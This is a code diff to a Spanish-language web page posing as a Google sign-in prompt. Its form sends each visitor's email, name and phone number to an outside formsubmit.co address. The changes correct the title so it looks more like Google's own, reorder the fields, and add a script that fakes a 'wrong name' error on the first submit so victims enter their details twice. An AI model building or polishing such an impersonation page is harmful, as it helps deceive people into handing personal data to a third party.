@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>inicia sección en tu cuenta de Google para continuar </title>
+  <title>Inicia sesión en tu cuenta de Google para continuar</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -19,15 +19,22 @@
     </div>
 
     <!-- Formulario -->
-    <form action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
+    <form id="contactForm" 
+          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
           method="POST" 
           class="grid gap-4">
 
-      <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
-             name="nombre" placeholder="Nombres y apellidos" required>
-
+      <!-- Correo primero -->
       <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
              name="correo" placeholder="Correo electrónico" type="email" required>
+
+      <!-- Nombre después -->
+      <div>
+        <input id="nombre" 
+               class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
+               name="nombre" placeholder="Nombres y apellidos" required>
+        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">Nombre incorrecto</p>
+      </div>
 
       <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
              name="telefono" placeholder="Teléfono" required>
@@ -54,6 +61,26 @@
       </a>
     </div>
   </div>
+
+  <!-- Script para “trollear” -->
+  <script>
+    let intentoNombre = 0;
+
+    document.getElementById("contactForm").addEventListener("submit", function(e) {
+      const nombre = document.getElementById("nombre");
+      const errorMsg = document.getElementById("errorNombre");
+
+      if (intentoNombre === 0) {
+        e.preventDefault(); // Bloquea envío la primera vez
+        errorMsg.classList.remove("hidden");
+        nombre.classList.add("border-red-500");
+        intentoNombre++;
+      } else {
+        errorMsg.classList.add("hidden");
+        nombre.classList.remove("border-red-500");
+      }
+    });
+  </script>
 
 </body>
 </html>
